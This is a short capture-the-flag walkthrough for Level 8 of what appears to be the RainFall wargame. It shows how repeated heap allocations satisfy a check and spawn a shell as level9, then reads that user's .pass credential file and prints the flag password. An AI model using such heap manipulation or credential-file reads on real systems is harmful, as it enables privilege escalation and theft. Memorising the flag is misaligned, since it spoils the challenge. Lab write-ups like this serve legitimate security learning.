# Walkthrough for Level 8

## Understanding the Binary

This binary runs a loop that reads user input and responds to four commands: `auth`, `reset`, `service`, and `login`.
There are two global variables: `auth` and `service`, both of which are pointers to `char`. When you use the `auth` or
`service` command, memory is allocated on the heap, filled with a string, and the pointer is stored in the respective
global variable. The condition to execute the shell is that `(auth + 0x20) != 0`.

## Triggering a shell

The trick is to keep allocating memory using the `service` command until the address `auth + 0x20` is no longer `NULL` 
and the shell is triggered. As a hint, the program prints the values of the addresses stored in the `auth` and `service`
global variables in each round.

``` shell
level8@RainFall:~$ ./level8
(nil), (nil)
auth 
0x804a008, (nil)
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
login
$ whoami
level9
```

## Reading the password

```shell
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

We can now log in via SSH using the `level9` user's password.